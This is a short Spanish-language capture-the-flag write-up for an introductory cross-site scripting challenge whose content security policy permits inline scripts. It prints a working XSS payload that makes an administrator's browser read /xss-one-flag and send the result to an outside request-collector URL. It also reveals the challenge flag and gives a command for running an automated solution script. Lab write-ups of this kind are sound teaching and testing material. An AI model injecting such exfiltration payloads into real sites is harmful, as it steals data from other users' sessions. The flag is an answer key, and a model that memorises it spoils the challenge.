Desafío introductorio de Cross-Site Scripting (XSS) donde la política de seguridad de contenido (CSP) permite scripts en línea (`unsafe-inline`).

Una carga útil como la siguiente permite que el navegador del administrador consulte `/xss-one-flag` y exfiltre la flag (`DUOC{exfiltracion_script_inline_41975}`):

```
<script>
	var xhr = new XMLHttpRequest(); 
	xhr.open('GET','/xss-one-flag', true); 
	xhr.onload = function () { 
		var request = new XMLHttpRequest(); 
		request.open('GET', 'https://REQUEST_BIN_URL?flag='+xhr.responseText, true);
		request.send()
	};
	xhr.send(null);
 </script>
```

Para probar el desafío de forma automatizada, ejecuta el siguiente comando:
`python solution.py <challenge-url>`
